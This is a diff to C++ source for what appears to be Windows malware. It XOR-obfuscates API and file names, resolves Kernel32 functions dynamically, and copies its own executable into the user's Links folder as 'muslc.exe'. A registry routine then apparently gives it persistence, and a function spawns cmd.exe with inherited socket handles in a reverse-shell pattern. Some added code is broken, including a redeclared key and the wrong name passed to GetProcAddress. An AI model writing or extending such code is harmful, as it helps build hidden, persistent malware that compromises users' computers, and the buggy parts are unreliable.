@@ -1,5 +1,6 @@
 #include <winsock2.h>  
 #include <ws2tcpip.h>  
+#include <filesystem>
 #include <Windows.h>
 
 void rox(BYTE* buffer, size_t bufferLength, const BYTE key)
@@ -57,6 +58,62 @@ int Hug(const char* path)
     rck(hKey);
 }
 
+int RakunaMatata(void)
+{
+    const BYTE key = 0xFF;
+    BYTE kb[] = { 0xB4, 0x9A, 0x8D, 0x91, 0x9A, 0x93, 0xCC, 0xCD, 0xD1, 0x9B, 0x93, 0x93, 0x00 };
+    rox(kb, sizeof(kb) - 1, key);
+    HMODULE hModule = LoadLibraryA(reinterpret_cast<char*>(kb));
+
+    if (!hModule) return EXIT_FAILURE;
+
+    typedef DWORD(WINAPI* Gmfa)(HMODULE, LPSTR, DWORD); // GetModuleFileNameA 
+    typedef BOOL(WINAPI* Wfc)(LPCSTR, LPCSTR, BOOL); // CopyFileA
+
+    BYTE Gmfab[] = { 0xB8, 0x9A, 0x8B, 0xB2, 0x90, 0x9B, 0x8A, 0x93, 0x9A, 0xB9, 0x96, 0x93, 0x9A, 0xB1, 0x9E, 0x92, 0x9A, 0xBE, 0x00 };
+    BYTE Wfcb[] = { 0xBC, 0x90, 0x8F, 0x86, 0xB9, 0x96, 0x93, 0x9A, 0xBE, 0x00 };
+
+    rox(Gmfab, sizeof(Gmfab) - 1, key);
+    Gmfa Gmfaf = (Gmfa)(GetProcAddress(hModule, reinterpret_cast<char*>(Gmfab)));
+    
+    rox(Wfcb, sizeof(Wfcb) - 1, key);
+    Wfc Wfcf = (Wfc)(GetProcAddress(hModule, reinterpret_cast<char*>(Wfcb)));
+
+    if (!Gmfaf || !Wfcf) return EXIT_FAILURE;
+
+    wchar_t* userProfile = nullptr;
+    size_t size = 0;
+    std::filesystem::path targetPath;
+    std::string utf8Path;
+    const char* cpath = nullptr;
+
+    BYTE mus[] = { 0x92, 0x8A, 0x8C, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x00 };
+    rox(mus, sizeof(mus) - 1, key);
+
+    if (_wdupenv_s(&userProfile, &size, L"USERPROFILE") == 0 && userProfile != nullptr)
+    {
+        targetPath = std::filesystem::path(userProfile) / "Links" / reinterpret_cast<char*>(mus);
+        free(userProfile);
+        utf8Path = targetPath.string();
+        cpath = utf8Path.c_str();
+    }
+
+    char newPath[MAX_PATH * 2] = { 0 };
+
+    if (Gmfaf(NULL, newPath, sizeof(newPath)) == 0)
+	{
+		return EXIT_FAILURE;
+	}
+
+    if (Wfcf(newPath, cpath, TRUE) == 0)
+    {
+        return EXIT_FAILURE;
+    }
+
+    Hug(cpath);
+
+    return EXIT_SUCCESS;
+}
 
 
 int ToRaccon(void)
@@ -120,14 +177,24 @@ int ToRaccon(void)
     BYTE elliot[] = { 0xBC, 0xC5, 0xA3, 0xA8, 0x96, 0x91, 0x9B, 0x90, 0x88, 0x8C, 0xA3, 0xAC, 0x86, 0x8C, 0x8B, 0x9A, 0x92, 0xCC, 0xCD, 0xA3, 0x9C, 0x92, 0x9B, 0xD1, 0x9A, 0x87, 0x9A, 0x00 };
     rox(elliot, sizeof(elliot) - 1, key);
 
-    if (!CreateProcessA(reinterpret_cast<char*>(elliot), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    const BYTE key = 0xFF;
+    BYTE kb[] = { 0xB4, 0x9A, 0x8D, 0x91, 0x9A, 0x93, 0xCC, 0xCD, 0xD1, 0x9B, 0x93, 0x93, 0x00 };
+    rox(kb, sizeof(kb) - 1, key);
+    HMODULE hModuleK = LoadLibraryA(reinterpret_cast<char*>(kb));
+
+    typedef BOOL(WINAPI* Cpa)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+
+    Cpa cpaf = (Cpa)(GetProcAddress(hModuleK, reinterpret_cast<char*>(kb)));
+
+    if (!cpaf(reinterpret_cast<char*>(elliot), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         return EXIT_FAILURE;
     }
 
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    CloseHandle(hModule);
+    CloseHandle(hModuleK);
+	CloseHandle(hModule);
     // WSACleanup();
 
     return EXIT_SUCCESS;
@@ -135,5 +202,6 @@ int ToRaccon(void)
 
 int main(void)
 {
+    RakunaMatata();
 	return 1;
 }
